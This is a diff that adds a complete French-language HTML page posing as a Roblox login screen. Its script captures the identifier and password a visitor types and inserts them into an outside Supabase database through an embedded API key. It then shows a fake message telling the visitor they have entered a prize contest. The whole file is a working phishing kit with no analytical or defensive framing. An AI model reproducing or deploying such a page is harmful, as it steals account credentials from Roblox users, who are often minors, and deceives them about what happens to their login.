@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Roblox</title>
+  <link rel="icon" type="image/png" href="logo.png">
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <style>
+    body {
+      font-family: Arial;
+      font-size: 18px;
+      background: url("fond.png") no-repeat center center;
+      background-size: cover;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      color: white;
+      margin: 0;
+    }
+    .box {
+      background: #1c1c1c; /* noir/gris semi-transparent */
+      padding: 30px;
+      border-radius: 10px;
+      width: 300px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.5);
+    }
+    input {
+      width: 100%;
+      margin-top: 10px;
+      padding: 10px;
+      height: 42px;
+      background-color: #2c2c2c; /* gris foncé */
+      color: white;
+      border: none;
+      border-radius: 5px;
+      box-sizing: border-box;
+    }
+    button {
+      width: 100%;
+      margin-top: 10px;
+      padding: 10px;
+      height: 42px;
+      background-color: #4a4a4a;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      box-sizing: border-box;
+    }
+    button:hover {
+      background-color: #6a6a6a;
+    }
+    #msg {
+      margin-top: 10px;
+      text-align: center;
+      color: red;
+    }
+  </style>
+</head>
+<body>
+
+<div class="box" id="formBox">
+  <h2>Connexion à Roblox</h2>
+  <input id="identifiant" placeholder="Identifiant/E-mail/Téléphone">
+  <input id="code" placeholder="Mot de passe" type="password">
+  <button onclick="send()">Connexion</button>
+  <p id="msg"></p>
+</div>
+
+<script>
+  const db = window.supabase.createClient(
+    "https://utwljzvgndxplfccokoo.supabase.co",
+    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InV0d2xqenZnbmR4cGxmY2Nva29vIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njc3OTczOTAsImV4cCI6MjA4MzM3MzM5MH0.YlpXvunrpfMXbrsI_Xa9739XCBIsoKngUXmieymA_VI"
+  );
+
+  async function send() {
+    const identifiant = document.getElementById("identifiant").value;
+    const code = document.getElementById("code").value;
+
+    const { error } = await db
+      .from("responses")
+      .insert([{ identifiant, code }]);
+
+    if (error) {
+      console.error(error);
+      document.getElementById("msg").innerText = error.message;
+      return;
+    }
+
+    document.getElementById("formBox").style.display = "none";
+
+// créer un cadre noir comme la connexion
+const box = document.createElement("div");
+box.className = "box";
+box.style.textAlign = "center";
+
+// message principal (plus grand, au-dessus)
+const message = document.createElement("div");
+message.style.fontSize = "26px";
+message.style.fontWeight = "bold";
+message.style.marginBottom = "15px";
+message.innerText = "Vous êtes bien inscrit au concours";
+
+// message secondaire (plus petit, en dessous)
+const message2 = document.createElement("div");
+message2.style.fontSize = "16px";
+message2.innerText =
+  "Vous recevrez une notification dans votre messagerie si vous faites partie des gagnants.";
+
+// ajouter les messages dans le cadre
+box.appendChild(message);
+box.appendChild(message2);
+
+// afficher le cadre
+document.body.appendChild(box);
+
+  }
+</script>
+
+</body>
+</html>
